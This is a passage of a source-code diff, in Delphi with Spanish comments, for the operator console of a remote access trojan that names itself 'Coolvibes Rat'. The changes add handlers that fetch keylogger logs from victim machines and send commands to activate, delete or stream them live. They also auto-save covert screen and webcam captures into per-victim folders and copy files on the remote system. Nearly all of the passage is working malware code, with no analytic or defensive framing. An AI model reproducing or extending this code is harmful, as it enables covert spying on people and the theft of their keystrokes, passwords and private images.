+    imgcaptura.Width := jpg.Width;
     imgcaptura.picture.Assign(JPG);
     StatusBar.Panels[1].Text := inttostr(ms.size div 1024)+'KB'; //Es interesante saber el tamaño
-
+    if(PrefijoGuardarCaptura <> '') then
+    begin
+      InumeroCaptura := InumeroCaptura+1;
+      CrearDirectoriosUsuario();
+      while fileexists(extractfiledir(paramstr(0))+'\Usuarios\'+NombrePc+'\Capturas\'+PrefijoGuardarCaptura+inttostr(InumeroCaptura)+'.jpeg') do
+        PrefijoGuardarCaptura := PrefijoGuardarCaptura + '_';
+      MS.SaveToFile(extractfiledir(paramstr(0))+'\Usuarios\'+NombrePc+'\Capturas\'+PrefijoGuardarCaptura+inttostr(InumeroCaptura)+'.jpeg');
+    end;
     MS.Free;
     JPG.Free;
     RecibiendoJPG := false;
@@ -2009,8 +2166,15 @@ begin
    // MS.LoadFromFile(ExtractFilePath(ParamStr(0)) + 'jpgcool.jpg');
     JPG := TJPEGImage.Create;
     JPG.LoadFromStream(MS);
-
     imgWebcam.picture.Assign(JPG);
+    if(PrefijoGuardarWebcam <> '') then
+    begin
+      InumeroWebcam := InumeroWebcam+1;
+      CrearDirectoriosUsuario();
+      while fileexists(extractfiledir(paramstr(0))+'\Usuarios\'+NombrePc+'\Webcam\'+PrefijoGuardarWebcam+inttostr(InumeroWebcam)+'.jpeg') do
+        PrefijoGuardarWebcam := PrefijoGuardarWebcam + '_';
+      MS.SaveToFile(extractfiledir(paramstr(0))+'\Usuarios\'+NombrePc+'\Webcam\'+PrefijoGuardarWebcam+inttostr(InumeroWebcam)+'.jpeg');
+    end;
     MS.Free;
     JPG.Free;
 
@@ -2022,21 +2186,94 @@ begin
   begin
     Delete(Buffer, 1, Pos('|', Buffer));
     Size := StrToInt(Trim(Buffer));  //Tamaño del Thumbnail
-    GenericBar := FormVisorDeMiniaturas.ProgressBarThumbnail;
+    GenericBar := (FormVisorDeMiniaturas as TFormVisorDeMiniaturas).ProgressBarThumbnail;
     MS := TMemoryStream.Create;
     MS.Position := 0;
     ObtenerScreenCap_CamCap(AThread, Size, MS);
     MS.Position := 0;
-    JPG := TJPEGImage.Create;
-    JPG.LoadFromStream(MS);
-
-    FormVisorDeMiniaturas.imageThumnail.picture.Assign(JPG);
+    if(MS.Size <> 1) then //si es =1 es que ha habido un error
+    begin
+      JPG := TJPEGImage.Create;
+      JPG.LoadFromStream(MS);
+      (FormVisorDeMiniaturas as TFormVisorDeMiniaturas).imageThumnail.picture.Assign(JPG);
+      JPG.Free;
+    end
+    else
+    begin
+      (FormVisorDeMiniaturas as TFormVisorDeMiniaturas).StatusBar.panels[3].text := 'Error al generar el thumbnail';
+    end;
     MS.Free;
-    JPG.Free;
+
     RecibiendoJPG := false;
-    FormVisorDeMiniaturas.callback();
+    (FormVisorDeMiniaturas as TFormVisorDeMiniaturas).callback();
+  end
+  else if Copy(PChar(Buffer), 1, 12) = 'KEYLOGGERLOG' then
+  begin
+    Delete(Buffer, 1, Pos('|', Buffer));
+    Size := StrToInt(Copy(Buffer, 1, Pos('|', Buffer) - 1));  //Tamaño del Log
+    GenericBar := ProgressBarKeylogger;
+    //StatusBar.Panels[1].Text := inttostr(size)+'B'; //Es interesante saber el tamaño
+    ObteneryAniadirKeyloggerLog(AThread, Size); //lo obtenemos y añadimos al richedit
+    SpeedButtonRecibirLog.Enabled := true;
+    RecibiendoJPG := false;
   end;
 end;
+
+procedure TFormControl.ObteneryAniadirKeyloggerLog(AThread: TIdPeerThread; filesize: int64);
+var
+  RecibidoTotal  : integer;
+  buffSize       : integer;
+  LineaNueva     : ansistring;
+  UltimaLinea    : boolean;
+  i              : integer;
+begin
+  if(filesize = 0) then exit;
+  RichEditKeylogger.clear;
+  pctProgressBarScreen := 0;
+  Athread.Synchronize(UpdateProgressBarScreen);
+  RecibidoTotal := 0;
+  try
+    while (RecibidoTotal < filesize) and (Athread.Connection.Connected) do
+    begin
+      LineaNueva := Athread.Connection.ReadLn;
+      RecibidoTotal := RecibidoTotal + Length(LineaNueva)+2;
+      if (Copy(LineaNueva, 1, 2) = '-[') then //evento
+      begin
+         RichEditKeylogger.SelAttributes.Style := [fsBold];
+         RichEditKeylogger.SelAttributes.Color := clRed;
+      end
+      else if (Copy(LineaNueva, 1, 2) = '-{') then
+      begin
+         RichEditKeylogger.SelAttributes.Style := [fsBold];
+         RichEditKeylogger.SelAttributes.Color := clgreen;
+      end
+      else
+      begin
+         RichEditKeylogger.SelAttributes.Style := [];
+         RichEditKeylogger.SelAttributes.Color := clblack;
+      end;
+      if not (RecibidoTotal < Filesize) then ultimalinea := true;
+
+      if((not ultimalinea)) then
+        RichEditKeylogger.SelText :=LineaNueva+#13+#10
+      else
+      if((ultimalinea)) then
+        RichEditKeylogger.SelText :=LineaNueva;
+      pctProgressBarScreen := Round((RecibidoTotal * 100) / FileSize);
+      Athread.Synchronize(UpdateProgressBarScreen);
+    end;
+  finally
+    CreardirectoriosUsuario();
+
+
+    while fileexists(extractfilepath(Paramstr(0))+'Usuarios\'+NombrePC+'\Klog'+inttostr(i)+'.txt') do
+      i := i+1;
+
+    RichEditKeylogger.plaintext := true;  //Se guarda como archivo de texto plano
+    RichEditKeylogger.lines.savetofile(extractfilepath(Paramstr(0))+'Usuarios\'+NombrePC+'\Klog'+inttostr(i)+'.txt');
+  end;//end de finally
+end;
+
 
 function TFormControl.ObtenerScreenCap_CamCap(AThread: TIdPeerThread; filesize: int64;var MS: TmemoryStream):string;
 var
@@ -2409,6 +2646,7 @@ end;
 
 procedure TFormControl.BtnServiciosClick(Sender: TObject);
 begin
+  BtnServicios.enabled := false;
   if not Servidor.Connection.Connected then
   begin
     MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
@@ -2725,11 +2963,11 @@ end;
 procedure TFormControl.SpinCaptureScreenChange(Sender: TObject);
 begin
   try
-    if SpinCaptureScreen.Value < 1 then
-      SpinCaptureScreen.Value := 1;
-    if SpinCaptureScreen.Value > 20000 then
-      SpinCaptureScreen.Value := 20000;
-    TimerCaptureScreen.Interval := SpinCaptureScreen.Value;
+    if SpinCaptureScreen.Value < 0 then
+      SpinCaptureScreen.Value := 0;
+    if SpinCaptureScreen.Value > 30 then
+      SpinCaptureScreen.Value := 30;
+    TimerCaptureScreen.Interval := SpinCaptureScreen.Value*1000+1;
   except
   end;
 end;
@@ -2747,7 +2985,7 @@ begin
       BtnCapturarScreen.Click;
   end; //Desactivaron el automatico
 
-  TimerCaptureScreen.Interval := SpinCaptureScreen.Value;
+  TimerCaptureScreen.Interval := SpinCaptureScreen.Value*1000+1;
   TimerCaptureScreen.Enabled  := CheckBoxAutoCapturaScreen.Checked;
 end;
 
@@ -2771,52 +3009,25 @@ begin
   while Assigned(mslistviewitem) do
   begin
     if (FormVisorDeMiniaturas = nil) then
-      FormVisorDeMiniaturas := TFormVisorDeMiniaturas.create(self,servidor,self);
-    FormVisorDeMiniaturas.show;
+      FormVisorDeMiniaturas := Tobject(TFormVisorDeMiniaturas.create(self,servidor,self));
+    (FormVisorDeMiniaturas as TFormVisorDeMiniaturas).show;
 
     FilePath := Trim(EditPathArchivos.Text) + Trim(mslistviewitem.Caption);
-    FormVisorDeMiniaturas.aniadirthumbnail(Filepath);
+    (FormVisorDeMiniaturas as TFormVisorDeMiniaturas).aniadirthumbnail(Filepath);
     mslistviewitem := ListViewArchivos.GetNextItem(mslistviewitem, sdAll, [isSelected]);
   end;
 
 
 end;
 
-procedure TFormControl.Especificarmanualmente1Click(Sender: TObject);
-begin
-
-TamanoRelativo := strtointdef(InputBox('Tamaño relativo','Tamaño relativo', '66'),66);
-
-end;
-
-procedure TFormControl.N1001Click(Sender: TObject);
-begin
-TamanoRelativo := 100;
-end;
-
-procedure TFormControl.N751Click(Sender: TObject);
-begin
-TamanoRelativo := 75;
-end;
-
-procedure TFormControl.N501Click(Sender: TObject);
-begin
-TamanoRelativo := 50;
-end;
-
-procedure TFormControl.N251Click(Sender: TObject);
-begin
-TamanoRelativo := 25;
-end;
-
 procedure TFormControl.SpinCamChange(Sender: TObject);
 begin
   try
-    if SpinCam.Value < 1 then
-      SpinCam.Value := 1;
-    if SpinCam.Value > 20000 then
-      SpinCam.Value := 20000;
-    TimerCamCapture.Interval := SpinCam.Value;
+    if SpinCam.Value < 0 then
+      SpinCam.Value := 0;
+    if SpinCam.Value > 30 then
+      SpinCam.Value := 30;
+    TimerCamCapture.Interval := SpinCam.Value*1000+1;
   except
   end;
 end;
@@ -2834,7 +3045,7 @@ begin
     BtnCapturarWebcam.Click;
   end; //Desactivaron el automatico
 
-  TimerCamCapture.Interval := SpinCam.Value;
+  TimerCamCapture.Interval := SpinCam.Value*1000+1;
   TimerCamCapture.Enabled  := CheckBoxAutoCamCapture.Checked;
 
 end;
@@ -2844,7 +3055,7 @@ begin
 
   if not Servidor.Connection.Connected then
   begin
-    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+   // MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
     self.TimerCamCapture.Enabled := False;
     exit;
   end;
@@ -2855,7 +3066,8 @@ end;
 procedure TFormControl.CheckBoxMostrarVentanasOcultasClick(
   Sender: TObject);
 begin
-BtnRefrescarVentanas.click;
+  if(BtnRefrescarVentanas.enabled) then
+  BtnRefrescarVentanas.click;
 end;
 
 procedure TFormControl.agregardescarga(filename:string);
@@ -2923,21 +3135,280 @@ begin          //la funcion que pide las capturas de webcam, de pantalla y los t
   if (RecibiendoJPG) then exit;   //Se piden por aqui para en el futuro crear un sistema por turnos 
   RecibiendoJPG := true;
   
-  if(tipo = 0) then
+  if(tipo = 0) then      //CAPSCREEN
   begin
-    if (tamanorelativo = 0)  then
-      Servidor.Connection.Writeln('CAPSCREEN' + IntToStr(TrackBarCalidad.Position)+'|'+inttostr(imgCaptura.Width)+'|'+inttostr(imgCaptura.Height))
-    else
-      Servidor.Connection.Writeln('CAPSCREEN' + IntToStr(TrackBarCalidad.Position)+'|%'+inttostr(tamanorelativo)+'|');
+      Servidor.Connection.Writeln('CAPSCREEN' + IntToStr(TrackBarCalidad.Position)+'|'+inttostr(imgCaptura.Height)+'|');
   end
-  else if (tipo = 1) then
+  else if (tipo = 1) then //webcam
   begin
     Servidor.Connection.Writeln('CAPTURAWEBCAM' + IntToStr(ComboboxWebcam.ItemIndex) +
     '|' + IntToStr(TrackBarCalidadWebcam.Position));
   end
-  else if (tipo = 2) then
+  else if (tipo = 2) then //thumbnails
   begin
     Servidor.Connection.Writeln(info);
+  end
+  else if(tipo = 3)  then//KEYLOGGERLOG
+  begin
+    Servidor.Connection.Writeln('RECIBIRKEYLOGGER');
   end;
 end;
+procedure TFormControl.Guardarimagen1Click(Sender: TObject);
+begin
+  DlgGuardar.Title      := 'Guardar imagen ::Coolvibes Rat::';
+  DlgGuardar.InitialDir := GetCurrentDir();
+  DlgGuardar.Filter     := 'Imagen .Jpeg|*.jpg';
+  DlgGuardar.DefaultExt := 'jpg';
+  if DlgGuardar.Execute then
+  begin
+    if Pagecontrol.activepage = TabScreenCap then
+      //Se está guardando una captura
+      imgCaptura.Picture.SaveToFile(DlgGuardar.FileName)
+    else  //Sino es una webcam
+      imgWebcam.Picture.SaveToFile(DlgGuardar.FileName);
+    StatusBar.Panels[1].Text := 'Imagen guardada como: ' + DlgGuardar.FileName;
+  end;
+end;
+
+procedure TFormControl.btnGuardarImagenClick(Sender: TObject);
+var
+  popupPoint : TPoint;
+begin
+  popupPoint.X := TSpeedButton(Sender).left;
+  popupPoint.Y := TSpeedButton(Sender).top;
+  popupPoint := ClientToScreen(popupPoint) ;
+
+  Popupguardarpantallaowebcam.popup(popupPoint.X, popupPoint.Y) ;
+
+end;
+
+procedure TFormControl.PopupGuardarPantallaoWebcamPopup(Sender: TObject);
+begin
+  if PageControl.activepage = TabScreencap then
+  begin
+    PopupGuardarPantallaoWebcam.items[0].caption := 'Guardar captura de pantalla';
+    if(PrefijoGuardarCaptura = '') then
+    begin
+      PopupGuardarPantallaoWebcam.items[1].caption := 'Activar guardado automático';
+      PopupGuardarPantallaoWebcam.items[1].checked := false;
+    end
+    else
+    begin
+      PopupGuardarPantallaoWebcam.items[1].caption := 'Desactivar guardado automático';
+      PopupGuardarPantallaoWebcam.items[1].checked := true;
+    end;
+  end
+  else
+  begin
+    PopupGuardarPantallaoWebcam.items[0].caption := 'Guardar captura de webcam';
+    if(PrefijoGuardarWebcam = '') then
+    begin
+      PopupGuardarPantallaoWebcam.items[1].caption := 'Activar guardado automático';
+      PopupGuardarPantallaoWebcam.items[1].checked := false;
+    end
+    else
+    begin
+      PopupGuardarPantallaoWebcam.items[1].caption := 'Desactivar guardado automático';
+      PopupGuardarPantallaoWebcam.items[1].checked := true;
+    end;
+  end;
+end;
+
+procedure TFormControl.Guardadoautomtico1Click(Sender: TObject);
+begin
+if((PrefijoGuardarCaptura = '') and (PageControl.activepage = TabScreencap)) then
+    PrefijoGuardarCaptura := InputBox('Prefijo captura','Prefijo captura', 'captura_')
+else
+if((PrefijoGuardarWebcam = '') and (PageControl.activepage = TabWebcam)) then
+    PrefijoGuardarWebcam := InputBox('Prefijo captura','Prefijo captura', 'webcam_')
+else
+if((PrefijoGuardarCaptura <> '') and (PageControl.activepage = TabScreencap)) then
+    PrefijoGuardarCaptura := ''
+else
+if((PrefijoGuardarWebcam <> '') and (PageControl.activepage = TabWebcam)) then
+    PrefijoGuardarWebcam := '';
+end;
+
+procedure TFormControl.TabKeyloggerShow(Sender: TObject);
+begin
+  if(not ProgressBarKeylogger.enabled) then  //al mostrarnos por primera vez
+  begin
+    SpeedButtonRecibirLog.enabled := false;
+    EditLogName.enabled := false;
+    SpeedButtonGuardarLog.enabled := false;
+    SpeedButtonActivarKeylogger.enabled := false;
+    SpeedButtonEliminarLog.enabled := false;
+    Servidor.Connection.Writeln('ESTADOKEYLOGGER'); //nada mas mostrarnos obtenemos el estado del keylogge
+  end;
+end;
+
+procedure TFormControl.SpeedButtonRecibirLogClick(Sender: TObject);
+begin
+  if not Servidor.Connection.Connected then exit;
+  SpeedButtonRecibirLog.enabled := false;  //Por estetica
+  pedirJPG(3,''); //no es un jpeg pero bueno......
+end;
+
+procedure TFormControl.SpeedButtonActivarKeyloggerClick(Sender: TObject);
+begin
+  SpeedButtonActivarKeylogger.enabled := false;
+  if(SpeedButtonActivarKeylogger.caption = 'Activar Keylogger') then
+  begin
+    if(EditLogName.text <> '') then
+      Servidor.Connection.WriteLn('ACTIVARKEYLOGGER|'+EditLogName.text+'|')
+    else
+      SpeedButtonActivarKeylogger.enabled := true;
+  end
+  else
+    Servidor.Connection.WriteLn('DESACTIVARKEYLOGGER|');
+
+end;
+
+procedure TFormControl.SpeedButtonEliminarLogClick(Sender: TObject);
+begin
+ Servidor.Connection.Writeln('ELIMINARLOGKEYLOGGER');
+end;
+
+procedure TFormControl.CheckBoxOnlineKeyloggerClick(Sender: TObject);
+function BooleanToStr(Bool: boolean; TrueString, FalseString: string): string;
+begin
+  if Bool then
+    Result := TrueString
+  else
+    Result := FalseString;
+end;
+begin
+  if not Servidor.Connection.Connected then exit;
+  Servidor.Connection.WriteLn('ONLINEKEYLOGGER|'+BooleanToStr(CheckBoxOnlineKeylogger.checked,'ACTIVAR','DESACTIVAR')+'|');
+end;
+
+procedure TFormControl.SpeedButtonGuardarLogClick(Sender: TObject);
+begin
+  DlgGuardar.Title      := 'Guardar Log de Keylogger ::Coolvibes Rat::';
+  DlgGuardar.InitialDir := GetCurrentDir();
+  DlgGuardar.Filter     := 'Texto .txt';
+  DlgGuardar.DefaultExt := 'txt';
+  if DlgGuardar.Execute then
+  begin 
+    RichEditKeylogger.plaintext := true;  //Se guarda como archivo de texto plano
+    RichEditKeylogger.lines.savetofile(DlgGuardar.FileName);
+
+    StatusBar.Panels[1].Text := 'Log guardado como: ' + DlgGuardar.FileName;
+  end;
+end;
+
+procedure TFormControl.TabServidorShow(Sender: TObject);
+begin
+  if(FormOpciones.CheckBoxAutoRefrescar.checked) then
+    BtnActualizarServidorInfo.click;
+end;
+
+procedure TFormControl.TabInfoShow(Sender: TObject);
+begin
+  if(FormOpciones.CheckBoxAutoRefrescar.checked) then
+   BtnRefrescarInformacion.click;
+end;
+
+procedure TFormControl.TabProcesosShow(Sender: TObject);
+begin
+  if(FormOpciones.CheckBoxAutoRefrescar.checked) then
+   BtnRefrescarProcesos.click;
+end;
+
+procedure TFormControl.TabVentanasShow(Sender: TObject);
+begin
+  if(FormOpciones.CheckBoxAutoRefrescar.checked) then
+   BtnRefrescarVentanas.click;
+end;
+
+procedure TFormControl.TabServiciosShow(Sender: TObject);
+begin
+  if(FormOpciones.CheckBoxAutoRefrescar.checked) then
+   BtnServicios.click;
+end;
+
+procedure TFormControl.TabFileManagerShow(Sender: TObject);
+begin
+  if(FormOpciones.CheckBoxAutoRefrescar.checked) then
+   BtnVerunidades.click;
+end;
+
+procedure TFormControl.TabScreencapShow(Sender: TObject);
+begin
+   Servidor.Connection.Writeln('DATOSCAPSCREEN');
+end;
+
+procedure TFormControl.TabWebcamShow(Sender: TObject);
+begin
+  if(FormOpciones.CheckBoxAutoRefrescar.checked) then
+    BtnObtenerWebcams.click;
+end;
+
+procedure TFormControl.FormCanResize(Sender: TObject; var NewWidth,
+  NewHeight: Integer; var Resize: Boolean);
+var
+  p, p2 : integer;
+begin
+
+
+end;
+
+procedure TFormControl.CheckBoxCompletaClick(Sender: TObject);
+begin
+  if checkboxcompleta.checked then
+  begin
+    imgcaptura.align := alnone;
+    imgCaptura.height := alturapantalla;   //La anchura se calcula sola al recibir la captura
+  end
+  else
+  begin
+    imgcaptura.align := alLeft;
+  end;
+end;
+
+procedure TFormControl.PrevisualizarImagenes1Click(Sender: TObject);
+begin
+  PrevisualizarImagenes1.checked := not PrevisualizarImagenes1.checked;
+  PrevisualizacionActiva := PrevisualizarImagenes1.checked;
+
+  if PrevisualizacionActiva then   //iconos grades
+  begin
+    Listviewarchivos.viewstyle := vsIcon;
+  end
+  else
+  begin
+    Listviewarchivos.viewstyle := vsReport;
+  end;
+end;
+
+procedure TFormControl.Copiar1Click(Sender: TObject);
+begin
+
+  if Servidor.Connection.Connected then
+  begin
+    mslistviewitem := ListViewArchivos.Selected;
+    while Assigned(mslistviewitem) do
+    begin
+    PortaPapeles := Portapapeles+EditPathArchivos.text+mslistviewitem.caption+'|';
+    mslistviewitem := ListViewArchivos.GetNextItem(mslistviewitem, sdAll, [isSelected]);
+    end;
+  end
+  else
+    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+
+end;
+
+procedure TFormControl.Pegar1Click(Sender: TObject);
+var
+  tmp : string;
+begin
+  while pos('|',portapapeles) > 0 do
+  begin
+    tmp := Copy(portapapeles, 1, Pos('|', portapapeles) - 1);
+    Delete(portapapeles, 1, Pos('|', portapapeles));
+    Servidor.Connection.Writeln('COPYF|'+tmp+'|'+EditPathArchivos.Text +extractfilename(tmp)+'|');
+  end;
+  btnactualizararchivos.Click;
+end;
+
 end.//Fin del proyecto
